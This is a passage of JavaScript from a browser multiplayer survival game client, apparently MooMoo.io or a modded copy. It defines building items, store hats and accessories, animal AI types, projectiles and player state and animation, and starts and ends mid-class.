            }, {
                age: 4,
                group: this.groups[6],
                name: "boost pad",
                desc: "provides boost when stepped on",
                req: ["stone", 20, "wood", 5],
                ignoreCollision: true,
                boostSpeed: 1.5,
                health: 150,
                colDiv: 0.7,
                scale: 45,
                holdOffset: 20,
                placeOffset: -5,
                itemID: 16,
                itemAID: 32,
            }, {
                age: 7,
                group: this.groups[7],
                doUpdate: true,
                name: "turret",
                desc: "defensive structure that shoots at enemies",
                req: ["wood", 200, "stone", 150],
                health: 800,
                projectile: 1,
                shootRange: 700,
                shootRate: 2200,
                scale: 43,
                holdOffset: 20,
                placeOffset: -5,
                itemID: 17,
                itemAID: 33,
            }, {
                age: 7,
                group: this.groups[8],
                name: "platform",
                desc: "platform to shoot over walls and cross over water",
                req: ["wood", 20],
                ignoreCollision: true,
                zIndex: 1,
                health: 300,
                scale: 43,
                holdOffset: 20,
                placeOffset: -5,
                itemID: 18,
                itemAID: 34,
            }, {
                age: 7,
                group: this.groups[9],
                name: "healing pad",
                desc: "standing on it will slowly heal you",
                req: ["wood", 30, "food", 10],
                ignoreCollision: true,
                healCol: 15,
                health: 400,
                colDiv: 0.7,
                scale: 45,
                holdOffset: 20,
                placeOffset: -5,
                itemID: 19,
                itemAID: 35,
            }, {
                age: 9,
                group: this.groups[10],
                name: "spawn pad",
                desc: "you will spawn here when you die but it will dissapear",
                req: ["wood", 100, "stone", 100],
                health: 400,
                ignoreCollision: true,
                spawnPoint: true,
                scale: 45,
                holdOffset: 20,
                placeOffset: -5,
                itemID: 20,
                itemAID: 36,
            }, {
                age: 7,
                group: this.groups[12],
                name: "blocker",
                desc: "blocks building in radius",
                req: ["wood", 30, "stone", 25],
                ignoreCollision: true,
                blocker: 300,
                health: 400,
                colDiv: 0.7,
                scale: 45,
                holdOffset: 20,
                placeOffset: -5,
                itemID: 21,
                itemAID: 37,
            }, {
                age: 7,
                group: this.groups[13],
                name: "teleporter",
                desc: "teleports you to a random point on the map",
                req: ["wood", 60, "stone", 60],
                ignoreCollision: true,
                teleport: true,
                health: 200,
                colDiv: 0.7,
                scale: 45,
                holdOffset: 20,
                placeOffset: -5,
                itemID: 22,
                itemAID: 38
            }];

            // CHECK ITEM ID:
            this.checkItem = {
                index: function(id, myItems) {
                    return [0, 1, 2].includes(id) ? 0 : [3, 4, 5].includes(id) ? 1 : [6, 7, 8, 9].includes(id) ? 2 : [10, 11, 12].includes(id) ? 3 : [13, 14].includes(id) ? 5 : [15, 16].includes(id) ? 4 : [17, 18, 19, 21, 22].includes(id) ? [13, 14].includes(myItems) ? 6 :
                    5 :
                    id == 20 ? [13, 14].includes(myItems) ? 7 :
                    6 :
                    undefined;
                }
            }

            // ASSIGN IDS:
            for (let i = 0; i < this.list.length; ++i) {
                this.list[i].id = i;
                if (this.list[i].pre) this.list[i].pre = i - this.list[i].pre;
            }

            // TROLOLOLOL:
            if (typeof window !== "undefined") {
                function shuffle(a) {
                    for (let i = a.length - 1; i > 0; i--) {
                        const j = Math.floor(Math.random() * (i + 1));
                        [a[i], a[j]] = [a[j], a[i]];
                    }
                    return a;
                }
                //shuffle(this.list);
            }
        }
    }
    class Objectmanager {
        constructor(GameObject, liztobj, UTILS, config, players, server) {
            let mathFloor = Math.floor,
                mathABS = Math.abs,
                mathCOS = Math.cos,
                mathSIN = Math.sin,
                mathPOW = Math.pow,
                mathSQRT = Math.sqrt;

            this.ignoreAdd = false;
            this.hitObj = [];

            // DISABLE OBJ:
            this.disableObj = function(obj) {
                obj.active = false;
            };

            // ADD NEW:
            let tmpObj;
            this.add = function(sid, x, y, dir, s, type, data, setSID, owner) {
                tmpObj = findObjectBySid(sid);
                if (!tmpObj) {
                    tmpObj = gameObjects.find((tmp) => !tmp.active);
                    if (!tmpObj) {
                        tmpObj = new GameObject(sid);
                        gameObjects.push(tmpObj);
                    }
                }
                if (setSID) {
                    tmpObj.sid = sid;
                }
                tmpObj.init(x, y, dir, s, type, data, owner);
            };

            // DISABLE BY SID:
            this.disableBySid = function(sid) {
                let find = findObjectBySid(sid);
                if (find) {
                    this.disableObj(find);
                }
            };

            // REMOVE ALL FROM PLAYER:
            this.removeAllItems = function(sid, server) {
                gameObjects.filter((tmp) => tmp.active && tmp.owner && tmp.owner.sid == sid).forEach((tmp) => this.disableObj(tmp));
            };

            // CHECK IF PLACABLE:
            this.checkItemLocation = function(x, y, s, sM, indx, ignoreWater, placer) {
                let cantPlace = liztobj.find((tmp) => tmp.active && UTILS.getDistance(x, y, tmp.x, tmp.y) < s + (tmp.blocker ? tmp.blocker : tmp.getScale(sM, tmp.isItem)));
                if (cantPlace) return false;
                if (!ignoreWater && indx != 18 && y >= config.mapScale / 2 - config.riverWidth / 2 && y <= config.mapScale / 2 + config.riverWidth / 2) return false;
                return true;
            };

        }
    }
    class Projectile {
        constructor(players, ais, objectManager, items, config, UTILS, server) {

            // INIT:
            this.init = function(indx, x, y, dir, spd, dmg, rng, scl, owner) {
                this.active = true;
                this.tickActive = true;
                this.indx = indx;
                this.x = x;
                this.y = y;
                this.x2 = x;
                this.y2 = y;
                this.dir = dir;
                this.skipMov = true;
                this.speed = spd;
                this.dmg = dmg;
                this.scale = scl;
                this.range = rng;
                this.r2 = rng;
                this.owner = owner;
            };

            // UPDATE:
            this.update = function(delta) {
                if (this.active) {
                    let tmpSpeed = this.speed * delta;
                    if (!this.skipMov) {
                        this.x += tmpSpeed * Math.cos(this.dir);
                        this.y += tmpSpeed * Math.sin(this.dir);
                        this.range -= tmpSpeed;
                        if (this.range <= 0) {
                            this.x += this.range * Math.cos(this.dir);
                            this.y += this.range * Math.sin(this.dir);
                            tmpSpeed = 1;
                            this.range = 0;
                            this.active = false;
                        }
                    } else {
                        this.skipMov = false;
                    }
                }
            };
            this.tickUpdate = function(delta) {
                if (this.tickActive) {
                    let tmpSpeed = this.speed * delta;
                    if (!this.skipMov) {
                        this.x2 += tmpSpeed * Math.cos(this.dir);
                        this.y2 += tmpSpeed * Math.sin(this.dir);
                        this.r2 -= tmpSpeed;
                        if (this.r2 <= 0) {
                            this.x2 += this.r2 * Math.cos(this.dir);
                            this.y2 += this.r2 * Math.sin(this.dir);
                            tmpSpeed = 1;
                            this.r2 = 0;
                            this.tickActive = false;
                        }
                    } else {
                        this.skipMov = false;
                    }
                }
            };
        }
    };
    class Store {
        constructor() {
            // STORE HATS:
            this.hats = [{
                id: 45,
                name: "Shame!",
                dontSell: true,
                price: 0,
                scale: 120,
                desc: "hacks are for winners"
            }, {
                id: 51,
                name: "Moo Cap",
                price: 0,
                scale: 120,
                desc: "coolest mooer around"
            }, {
                id: 50,
                name: "Apple Cap",
                price: 0,
                scale: 120,
                desc: "apple farms remembers"
            }, {
                id: 28,
                name: "Moo Head",
                price: 0,
                scale: 120,
                desc: "no effect"
            }, {
                id: 29,
                name: "Pig Head",
                price: 0,
                scale: 120,
                desc: "no effect"
            }, {
                id: 30,
                name: "Fluff Head",
                price: 0,
                scale: 120,
                desc: "no effect"
            }, {
                id: 36,
                name: "Pandou Head",
                price: 0,
                scale: 120,
                desc: "no effect"
            }, {
                id: 37,
                name: "Bear Head",
                price: 0,
                scale: 120,
                desc: "no effect"
            }, {
                id: 38,
                name: "Monkey Head",
                price: 0,
                scale: 120,
                desc: "no effect"
            }, {
                id: 44,
                name: "Polar Head",
                price: 0,
                scale: 120,
                desc: "no effect"
            }, {
                id: 35,
                name: "Fez Hat",
                price: 0,
                scale: 120,
                desc: "no effect"
            }, {
                id: 42,
                name: "Enigma Hat",
                price: 0,
                scale: 120,
                desc: "join the enigma army"
            }, {
                id: 43,
                name: "Blitz Hat",
                price: 0,
                scale: 120,
                desc: "hey everybody i'm blitz"
            }, {
                id: 49,
                name: "Bob XIII Hat",
                price: 0,
                scale: 120,
                desc: "like and subscribe"
            }, {
                id: 57,
                name: "Pumpkin",
                price: 50,
                scale: 120,
                desc: "Spooooky"
            }, {
                id: 8,
                name: "Bummle Hat",
                price: 100,
                scale: 120,
                desc: "no effect"
            }, {
                id: 2,
                name: "Straw Hat",
                price: 500,
                scale: 120,
                desc: "no effect"
            }, {
                id: 15,
                name: "Winter Cap",
                price: 600,
                scale: 120,
                desc: "allows you to move at normal speed in snow",
                coldM: 1
            }, {
                id: 5,
                name: "Cowboy Hat",
                price: 1000,
                scale: 120,
                desc: "no effect"
            }, {
                id: 4,
                name: "Ranger Hat",
                price: 2000,
                scale: 120,
                desc: "no effect"
            }, {
                id: 18,
                name: "Explorer Hat",
                price: 2000,
                scale: 120,
                desc: "no effect"
            }, {
                id: 31,
                name: "Flipper Hat",
                price: 2500,
                scale: 120,
                desc: "have more control while in water",
                watrImm: true
            }, {
                id: 1,
                name: "Marksman Cap",
                price: 3000,
                scale: 120,
                desc: "increases arrow speed and range",
                aMlt: 1.3
            }, {
                id: 10,
                name: "Bush Gear",
                price: 3000,
                scale: 160,
                desc: "allows you to disguise yourself as a bush"
            }, {
                id: 48,
                name: "Halo",
                price: 3000,
                scale: 120,
                desc: "no effect"
            }, {
                id: 6,
                name: "Soldier Helmet",
                price: 4000,
                scale: 120,
                desc: "reduces damage taken but slows movement",
                spdMult: 0.94,
                dmgMult: 0.75
            }, {
                id: 23,
                name: "Anti Venom Gear",
                price: 4000,
                scale: 120,
                desc: "makes you immune to poison",
                poisonRes: 1
            }, {
                id: 13,
                name: "Medic Gear",
                price: 5000,
                scale: 110,
                desc: "slowly regenerates health over time",
                healthRegen: 3
            }, {
                id: 9,
                name: "Miners Helmet",
                price: 5000,
                scale: 120,
                desc: "earn 1 extra gold per resource",
                extraGold: 1
            }, {
                id: 32,
                name: "Musketeer Hat",
                price: 5000,
                scale: 120,
                desc: "reduces cost of projectiles",
                projCost: 0.5
            }, {
                id: 7,
                name: "Bull Helmet",
                price: 6000,
                scale: 120,
                desc: "increases damage done but drains health",
                healthRegen: -5,
                dmgMultO: 1.5,
                spdMult: 0.96
            }, {
                id: 22,
                name: "Emp Helmet",
                price: 6000,
                scale: 120,
                desc: "turrets won't attack but you move slower",
                antiTurret: 1,
                spdMult: 0.7
            }, {
                id: 12,
                name: "Booster Hat",
                price: 6000,
                scale: 120,
                desc: "increases your movement speed",
                spdMult: 1.16
            }, {
                id: 26,
                name: "Barbarian Armor",
                price: 8000,
                scale: 120,
                desc: "knocks back enemies that attack you",
                dmgK: 0.6
            }, {
                id: 21,
                name: "Plague Mask",
                price: 10000,
                scale: 120,
                desc: "melee attacks deal poison damage",
                poisonDmg: 5,
                poisonTime: 6
            }, {
                id: 46,
                name: "Bull Mask",
                price: 10000,
                scale: 120,
                desc: "bulls won't target you unless you attack them",
                bullRepel: 1
            }, {
                id: 14,
                name: "Windmill Hat",
                topSprite: true,
                price: 10000,
                scale: 120,
                desc: "generates points while worn",
                pps: 1.5
            }, {
                id: 11,
                name: "Spike Gear",
                topSprite: true,
                price: 10000,
                scale: 120,
                desc: "deal damage to players that damage you",
                dmg: 0.45
            }, {
                id: 53,
                name: "Turret Gear",
                topSprite: true,
                price: 10000,
                scale: 120,
                desc: "you become a walking turret",
                turret: {
                    proj: 1,
                    range: 700,
                    rate: 2500
                },
                spdMult: 0.7
            }, {
                id: 20,
                name: "Samurai Armor",
                price: 12000,
                scale: 120,
                desc: "increased attack speed and fire rate",
                atkSpd: 0.78
            }, {
                id: 58,
                name: "Dark Knight",
                price: 12000,
                scale: 120,
                desc: "restores health when you deal damage",
                healD: 0.4
            }, {
                id: 27,
                name: "Scavenger Gear",
                price: 15000,
                scale: 120,
                desc: "earn double points for each kill",
                kScrM: 2
            }, {
                id: 40,
                name: "Tank Gear",
                price: 15000,
                scale: 120,
                desc: "increased damage to buildings but slower movement",
                spdMult: 0.3,
                bDmg: 3.3
            }, {
                id: 52,
                name: "Thief Gear",
                price: 15000,
                scale: 120,
                desc: "steal half of a players gold when you kill them",
                goldSteal: 0.5
            }, {
                id: 55,
                name: "Bloodthirster",
                price: 20000,
                scale: 120,
                desc: "Restore Health when dealing damage. And increased damage",
                healD: 0.25,
                dmgMultO: 1.2,
            }, {
                id: 56,
                name: "Assassin Gear",
                price: 20000,
                scale: 120,
                desc: "Go invisible when not moving. Can't eat. Increased speed",
                noEat: true,
                spdMult: 1.1,
                invisTimer: 1000
            }];

            // STORE ACCESSORIES:
            this.accessories = [{
                id: 12,
                name: "Snowball",
                price: 1000,
                scale: 105,
                xOff: 18,
                desc: "no effect"
            }, {
                id: 9,
                name: "Tree Cape",
                price: 1000,
                scale: 90,
                desc: "no effect"
            }, {
                id: 10,
                name: "Stone Cape",
                price: 1000,
                scale: 90,
                desc: "no effect"
            }, {
                id: 3,
                name: "Cookie Cape",
                price: 1500,
                scale: 90,
                desc: "no effect"
            }, {
                id: 8,
                name: "Cow Cape",
                price: 2000,
                scale: 90,
                desc: "no effect"
            }, {
                id: 11,
                name: "Monkey Tail",
                price: 2000,
                scale: 97,
                xOff: 25,
                desc: "Super speed but reduced damage",
                spdMult: 1.35,
                dmgMultO: 0.2
            }, {
                id: 17,
                name: "Apple Basket",
                price: 3000,
                scale: 80,
                xOff: 12,
                desc: "slowly regenerates health over time",
                healthRegen: 1
            }, {
                id: 6,
                name: "Winter Cape",
                price: 3000,
                scale: 90,
                desc: "no effect"
            }, {
                id: 4,
                name: "Skull Cape",
                price: 4000,
                scale: 90,
                desc: "no effect"
            }, {
                id: 5,
                name: "Dash Cape",
                price: 5000,
                scale: 90,
                desc: "no effect"
            }, {
                id: 2,
                name: "Dragon Cape",
                price: 6000,
                scale: 90,
                desc: "no effect"
            }, {
                id: 1,
                name: "Super Cape",
                price: 8000,
                scale: 90,
                desc: "no effect"
            }, {
                id: 7,
                name: "Troll Cape",
                price: 8000,
                scale: 90,
                desc: "no effect"
            }, {
                id: 14,
                name: "Thorns",
                price: 10000,
                scale: 115,
                xOff: 20,
                desc: "no effect"
            }, {
                id: 15,
                name: "Blockades",
                price: 10000,
                scale: 95,
                xOff: 15,
                desc: "no effect"
            }, {
                id: 20,
                name: "Devils Tail",
                price: 10000,
                scale: 95,
                xOff: 20,
                desc: "no effect"
            }, {
                id: 16,
                name: "Sawblade",
                price: 12000,
                scale: 90,
                spin: true,
                xOff: 0,
                desc: "deal damage to players that damage you",
                dmg: 0.15
            }, {
                id: 13,
                name: "Angel Wings",
                price: 15000,
                scale: 138,
                xOff: 22,
                desc: "slowly regenerates health over time",
                healthRegen: 3
            }, {
                id: 19,
                name: "Shadow Wings",
                price: 15000,
                scale: 138,
                xOff: 22,
                desc: "increased movement speed",
                spdMult: 1.1
            }, {
                id: 18,
                name: "Blood Wings",
                price: 20000,
                scale: 178,
                xOff: 26,
                desc: "restores health when you deal damage",
                healD: 0.2
            }, {
                id: 21,
                name: "Corrupt X Wings",
                price: 20000,
                scale: 178,
                xOff: 26,
                desc: "deal damage to players that damage you",
                dmg: 0.25
            }];
        }
    };
    class ProjectileManager {
        constructor(Projectile, projectiles, players, ais, objectManager, items, config, UTILS, server) {
            this.addProjectile = function(x, y, dir, range, speed, indx, owner, ignoreObj, layer, inWindow) {
                let tmpData = items.projectiles[indx];
                let tmpProj;
                for (let i = 0; i < projectiles.length; ++i) {
                    if (!projectiles[i].active) {
                        tmpProj = projectiles[i];
                        break;
                    }
                }
                if (!tmpProj) {
                    tmpProj = new Projectile(players, ais, objectManager, items, config, UTILS, server);
                    tmpProj.sid = projectiles.length;
                    projectiles.push(tmpProj);
                }
                tmpProj.init(indx, x, y, dir, speed, tmpData.dmg, range, tmpData.scale, owner);
                tmpProj.ignoreObj = ignoreObj;
                tmpProj.layer = layer || tmpData.layer;
                tmpProj.inWindow = inWindow;
                tmpProj.src = tmpData.src;
                return tmpProj;
            };
        }
    };
    class AiManager {

        // AI MANAGER:
        constructor(ais, AI, players, items, objectManager, config, UTILS, scoreCallback, server) {

            // AI TYPES:
            this.aiTypes = [{
                id: 0,
                src: "cow_1",
                killScore: 150,
                health: 500,
                weightM: 0.8,
                speed: 0.00095,
                turnSpeed: 0.001,
                scale: 72,
                drop: ["food", 50]
            }, {
                id: 1,
                src: "pig_1",
                killScore: 200,
                health: 800,
                weightM: 0.6,
                speed: 0.00085,
                turnSpeed: 0.001,
                scale: 72,
                drop: ["food", 80]
            }, {
                id: 2,
                name: "Bull",
                src: "bull_2",
                hostile: true,
                dmg: 20,
                killScore: 1000,
                health: 1800,
                weightM: 0.5,
                speed: 0.00094,
                turnSpeed: 0.00074,
                scale: 78,
                viewRange: 800,
                chargePlayer: true,
                drop: ["food", 100]
            }, {
                id: 3,
                name: "Bully",
                src: "bull_1",
                hostile: true,
                dmg: 20,
                killScore: 2000,
                health: 2800,
                weightM: 0.45,
                speed: 0.001,
                turnSpeed: 0.0008,
                scale: 90,
                viewRange: 900,
                chargePlayer: true,
                drop: ["food", 400]
            }, {
                id: 4,
                name: "Wolf",
                src: "wolf_1",
                hostile: true,
                dmg: 8,
                killScore: 500,
                health: 300,
                weightM: 0.45,
                speed: 0.001,
                turnSpeed: 0.002,
                scale: 84,
                viewRange: 800,
                chargePlayer: true,
                drop: ["food", 200]
            }, {
                id: 5,
                name: "Quack",
                src: "chicken_1",
                dmg: 8,
                killScore: 2000,
                noTrap: true,
                health: 300,
                weightM: 0.2,
                speed: 0.0018,
                turnSpeed: 0.006,
                scale: 70,
                drop: ["food", 100]
            }, {
                id: 6,
                name: "MOOSTAFA",
                nameScale: 50,
                src: "enemy",
                hostile: true,
                dontRun: true,
                fixedSpawn: true,
                spawnDelay: 60000,
                noTrap: true,
                colDmg: 100,
                dmg: 40,
                killScore: 8000,
                health: 18000,
                weightM: 0.4,
                speed: 0.0007,
                turnSpeed: 0.01,
                scale: 80,
                spriteMlt: 1.8,
                leapForce: 0.9,
                viewRange: 1000,
                hitRange: 210,
                hitDelay: 1000,
                chargePlayer: true,
                drop: ["food", 100]
            }, {
                id: 7,
                name: "Treasure",
                hostile: true,
                nameScale: 35,
                src: "crate_1",
                fixedSpawn: true,
                spawnDelay: 120000,
                colDmg: 200,
                killScore: 5000,
                health: 20000,
                weightM: 0.1,
                speed: 0.0,
                turnSpeed: 0.0,
                scale: 70,
                spriteMlt: 1.0
            }, {
                id: 8,
                name: "MOOFIE",
                src: "wolf_2",
                hostile: true,
                fixedSpawn: true,
                dontRun: true,
                hitScare: 4,
                spawnDelay: 30000,
                noTrap: true,
                nameScale: 35,
                dmg: 10,
                colDmg: 100,
                killScore: 3000,
                health: 7000,
                weightM: 0.45,
                speed: 0.0015,
                turnSpeed: 0.002,
                scale: 90,
                viewRange: 800,
                chargePlayer: true,
                drop: ["food", 1000]
            }, {
                id: 9,
                name: "💀MOOFIE",
                src: "wolf_2",
                hostile: !0,
                fixedSpawn: !0,
                dontRun: !0,
                hitScare: 50,
                spawnDelay: 6e4,
                noTrap: !0,
                nameScale: 35,
                dmg: 12,
                colDmg: 100,
                killScore: 3e3,
                health: 9e3,
                weightM: .45,
                speed: .0015,
                turnSpeed: .0025,
                scale: 94,
                viewRange: 1440,
                chargePlayer: !0,
                drop: ["food", 3e3],
                minSpawnRange: .85,
                maxSpawnRange: .9
            }, {
                id: 10,
                name: "💀Wolf",
                src: "wolf_1",
                hostile: !0,
                fixedSpawn: !0,
                dontRun: !0,
                hitScare: 50,
                spawnDelay: 3e4,
                dmg: 10,
                killScore: 700,
                health: 500,
                weightM: .45,
                speed: .00115,
                turnSpeed: .0025,
                scale: 88,
                viewRange: 1440,
                chargePlayer: !0,
                drop: ["food", 400],
                minSpawnRange: .85,
                maxSpawnRange: .9
            }, {
                id: 11,
                name: "💀Bully",
                src: "bull_1",
                hostile: !0,
                fixedSpawn: !0,
                dontRun: !0,
                hitScare: 50,
                dmg: 20,
                killScore: 5e3,
                health: 5e3,
                spawnDelay: 1e5,
                weightM: .45,
                speed: .00115,
                turnSpeed: .0025,
                scale: 94,
                viewRange: 1440,
                chargePlayer: !0,
                drop: ["food", 800],
                minSpawnRange: .85,
                maxSpawnRange: .9
            }];

            // SPAWN AI:
            this.spawn = function(x, y, dir, index) {
                let tmpObj = ais.find((tmp) => !tmp.active);
                if (!tmpObj) {
                    tmpObj = new AI(ais.length, objectManager, players, items, UTILS, config, scoreCallback, server);
                    ais.push(tmpObj);
                }
                tmpObj.init(x, y, dir, index, this.aiTypes[index]);
                return tmpObj;
            };
        }

    };
    class AI {
        constructor(sid, objectManager, players, items, UTILS, config, scoreCallback, server) {
            this.sid = sid;
            this.isAI = true;
            this.nameIndex = UTILS.randInt(0, config.cowNames.length - 1);

            // INIT:
            this.init = function(x, y, dir, index, data) {
                this.x = x;
                this.y = y;
                this.startX = data.fixedSpawn ? x : null;
                this.startY = data.fixedSpawn ? y : null;
                this.xVel = 0;
                this.yVel = 0;
                this.zIndex = 0;
                this.dir = dir;
                this.dirPlus = 0;
                this.showName = 'aaa';
                this.index = index;
                this.src = data.src;
                if (data.name) this.name = data.name;
                this.weightM = data.weightM;
                this.speed = data.speed;
                this.killScore = data.killScore;
                this.turnSpeed = data.turnSpeed;
                this.scale = data.scale;
                this.maxHealth = data.health;
                this.leapForce = data.leapForce;
                this.health = this.maxHealth;
                this.chargePlayer = data.chargePlayer;
                this.viewRange = data.viewRange;
                this.drop = data.drop;
                this.dmg = data.dmg;
                this.hostile = data.hostile;
                this.dontRun = data.dontRun;
                this.hitRange = data.hitRange;
                this.hitDelay = data.hitDelay;
                this.hitScare = data.hitScare;
                this.spriteMlt = data.spriteMlt;
                this.nameScale = data.nameScale;
                this.colDmg = data.colDmg;
                this.noTrap = data.noTrap;
                this.spawnDelay = data.spawnDelay;
                this.hitWait = 0;
                this.waitCount = 1000;
                this.moveCount = 0;
                this.targetDir = 0;
                this.active = true;
                this.alive = true;
                this.runFrom = null;
                this.chargeTarget = null;
                this.dmgOverTime = {};
            };

            let tmpRatio = 0;
            let animIndex = 0;
            this.animate = function(delta) {
                if (this.animTime > 0) {
                    this.animTime -= delta;
                    if (this.animTime <= 0) {
                        this.animTime = 0;
                        this.dirPlus = 0;
                        tmpRatio = 0;
                        animIndex = 0;
                    } else {
                        if (animIndex == 0) {
                            tmpRatio += delta / (this.animSpeed * config.hitReturnRatio);
                            this.dirPlus = UTILS.lerp(0, this.targetAngle, Math.min(1, tmpRatio));
                            if (tmpRatio >= 1) {
                                tmpRatio = 1;
                                animIndex = 1;
                            }
                        } else {
                            tmpRatio -= delta / (this.animSpeed * (1 - config.hitReturnRatio));
                            this.dirPlus = UTILS.lerp(0, this.targetAngle, Math.max(0, tmpRatio));
                        }
                    }
                }
            };

            // ANIMATION:
            this.startAnim = function() {
                this.animTime = this.animSpeed = 600;
                this.targetAngle = Math.PI * 0.8;
                tmpRatio = 0;
                animIndex = 0;
            };

        };

    };
    class addCh {
        constructor(x, y, chat, tmpObj) {
            this.x = x;
            this.y = y;
            this.alpha = 0;
            this.active = true;
            this.alive = false;
            this.chat = chat;
            this.owner = tmpObj;
        };
    };
    class DeadPlayer {
        constructor(x, y, dir, buildIndex, weaponIndex, weaponVariant, skinColor, scale, name) {
            this.x = x;
            this.y = y;
            this.lastDir = dir;
            this.dir = dir + Math.PI;
            this.buildIndex = buildIndex;
            this.weaponIndex = weaponIndex;
            this.weaponVariant = weaponVariant;
            this.skinColor = skinColor;
            this.scale = scale;
            this.visScale = 0;
            this.name = name;
            this.alpha = 1;
            this.active = true;
            this.animate = function(delta) {
                let d2 = UTILS.getAngleDist(this.lastDir, this.dir);
                if (d2 > 0.01) {
                    this.dir += d2 / 20;
                } else {
                    this.dir = this.lastDir;
                }
                if (this.visScale < this.scale) {
                    this.visScale += delta / (this.scale / 2);
                    if (this.visScale >= this.scale) {
                        this.visScale = this.scale;
                    }
                }
                this.alpha -= delta / 30000;
                if (this.alpha <= 0) {
                    this.alpha = 0;
                    this.active = false;
                }
            }
        }
    };
    class Player {
        constructor(id, sid, config, UTILS, projectileManager, objectManager, players, ais, items, hats, accessories, server, scoreCallback, iconCallback) {
            this.id = id;
            this.sid = sid;
            this.tmpScore = 0;
            this.team = null;
            this.latestSkin = 0;
            this.oldSkinIndex = 0;
            this.skinIndex = 0;
            this.latestTail = 0;
            this.oldTailIndex = 0;
            this.tailIndex = 0;
            this.hitTime = 0;
            this.lastHit = 0;
            this.showName = 'NOOO';
            this.tails = {};
            for (let i = 0; i < accessories.length; ++i) {
                if (accessories[i].price <= 0)
                    this.tails[accessories[i].id] = 1;
            }
            this.skins = {};
            for (let i = 0; i < hats.length; ++i) {
                if (hats[i].price <= 0)
                    this.skins[hats[i].id] = 1;
            }
            this.points = 0;
            this.dt = 0;
            this.hidden = false;
            this.itemCounts = {};
            this.isPlayer = true;
            this.pps = 0;
            this.moveDir = undefined;
            this.skinRot = 0;
            this.lastPing = 0;
            this.iconIndex = 0;
            this.skinColor = 0;
            this.dist2 = 0;
            this.aim2 = 0;
            this.maxSpeed = 1;
            this.chat = {
                message: null,
                count: 0
            };
            this.circle = false;
            this.cAngle = 0;
            // SPAWN:
            this.spawn = function(moofoll) {
                this.attacked = false;
                this.timeDamaged = 0;
                this.timeHealed = 0;
                this.pinge = 0;
                this.millPlace = 'NOOO';
                this.lastshamecount = 0;
                this.death = false;
                this.spinDir = 0;
                this.sync = false;
                this.antiBull = 0;
                this.bullTimer = 0;
                this.poisonTimer = 0;
                this.active = true;
                this.alive = true;
                this.lockMove = false;
                this.lockDir = false;
                this.minimapCounter = 0;
                this.chatCountdown = 0;
                this.shameCount = 0;
                this.shameTimer = 0;
                this.sentTo = {};
                this.gathering = 0;
                this.gatherIndex = 0;
                this.shooting = {};
                this.shootIndex = 9;
                this.autoGather = 0;
                this.animTime = 0;
                this.animSpeed = 0;
                this.mouseState = 0;
                this.buildIndex = -1;
                this.weaponIndex = 0;
                this.weaponCode = 0;
                this.weaponVariant = 0;
                this.primaryIndex = undefined;
                this.secondaryIndex = undefined;
                this.dmgOverTime = {};
                this.noMovTimer = 0;
                this.maxXP = 300;
                this.XP = 0;
                this.age = 1;
                this.kills = 0;
                this.upgrAge = 2;
                this.upgradePoints = 0;
                this.x = 0;
                this.y = 0;
                this.oldXY = {
                    x: 0,
                    y: 0
                };
                this.zIndex = 0;
                this.xVel = 0;
                this.yVel = 0;
                this.slowMult = 1;
                this.dir = 0;
                this.dirPlus = 0;
                this.targetDir = 0;
                this.targetAngle = 0;
                this.maxHealth = 100;
                this.health = this.maxHealth;
                this.oldHealth = this.maxHealth;
                this.damaged = 0;
                this.scale = config.playerScale;
                this.speed = config.playerSpeed;
                this.resetMoveDir();
                this.resetResources(moofoll);
                this.items = [0, 3, 6, 10];
                this.weapons = [0];
                this.shootCount = 0;
                this.weaponXP = [];
                this.reloads = {
                    0: 0,
                    1: 0,
                    2: 0,
                    3: 0,
                    4: 0,
                    5: 0,
                    6: 0,
                    7: 0,
                    8: 0,
                    9: 0,
                    10: 0,
                    11: 0,
                    12: 0,
                    13: 0,
                    14: 0,
                    15: 0,
                    53: 0,
                };
                this.bowThreat = {
                    9: 0,
                    12: 0,
                    13: 0,
                    15: 0,
                };
                this.damageThreat = 0;
                this.inTrap = false;
                this.canEmpAnti = false;
                this.empAnti = false;
                this.soldierAnti = false;
                this.poisonTick = 0;
                this.bullTick = 0;
                this.setPoisonTick = false;
                this.setBullTick = false;
                this.antiTimer = 2;
            };

            // RESET MOVE DIR:
            this.resetMoveDir = function() {
                this.moveDir = undefined;
            };

            // RESET RESOURCES:
            this.resetResources = function(moofoll) {
                for (let i = 0; i < config.resourceTypes.length; ++i) {
                    this[config.resourceTypes[i]] = moofoll ? 100 : 0;
                }
            };

            // ADD ITEM:
            this.getItemType = function(id) {
                let findindx = this.items.findIndex((ids) => ids == id);
                if (findindx != -1) {
                    return findindx;
                } else {
                    return items.checkItem.index(id, this.items);
                }
            };

            // SET DATA:
            this.setData = function(data) {
                this.id = data[0];
                this.sid = data[1];
                this.name = data[2];
                this.x = data[3];
                this.y = data[4];
                this.dir = data[5];
                this.health = data[6];
                this.maxHealth = data[7];
                this.scale = data[8];
                this.skinColor = data[9];
            };

            // UPDATE POISON TICK:
            this.updateTimer = function() {

                this.bullTimer -= 1;
                if (this.bullTimer <= 0) {
                    this.setBullTick = false;
                    this.bullTick = game.tick - 1;
                    this.bullTimer = config.serverUpdateRate;
                }
                this.poisonTimer -= 1;
                if (this.poisonTimer <= 0) {
                    this.setPoisonTick = false;
                    this.poisonTick = game.tick - 1;
                    this.poisonTimer = config.serverUpdateRate;
                }

            };
            this.update = function(delta) {
                if (this.active) {

                    // MOVE:
                    let gear = {
                        skin: findID(hats, this.skinIndex),
                        tail: findID(accessories, this.tailIndex)
                    }
                    let spdMult = ((this.buildIndex >= 0) ? 0.5 : 1) * (items.weapons[this.weaponIndex].spdMult || 1) * (gear.skin ? (gear.skin.spdMult || 1) : 1) * (gear.tail ? (gear.tail.spdMult || 1) : 1) * (this.y <= config.snowBiomeTop ? ((gear.skin && gear.skin.coldM) ? 1 : config.snowSpeed) : 1) * this.slowMult;
                    this.maxSpeed = spdMult;

                }
            };

            let tmpRatio = 0;
            let animIndex = 0;
            this.animate = function(delta) {
                if (this.animTime > 0) {
                    this.animTime -= delta;
                    if (this.animTime <= 0) {
                        this.animTime = 0;
                        this.dirPlus = 0;
                        tmpRatio = 0;
                        animIndex = 0;
                    } else {
                        if (animIndex == 0) {
                            tmpRatio += delta / (this.animSpeed * config.hitReturnRatio);
                            this.dirPlus = UTILS.lerp(0, this.targetAngle, Math.min(1, tmpRatio));
                            if (tmpRatio >= 1) {
                                tmpRatio = 1;
                                animIndex = 1;
                            }
                        } else {
                            tmpRatio -= delta / (this.animSpeed * (1 - config.hitReturnRatio));
                            this.dirPlus = UTILS.lerp(0, this.targetAngle, Math.max(0, tmpRatio));
                        }
                    }
                }
            };

            // GATHER ANIMATION:
            this.startAnim = function(didHit, index) {
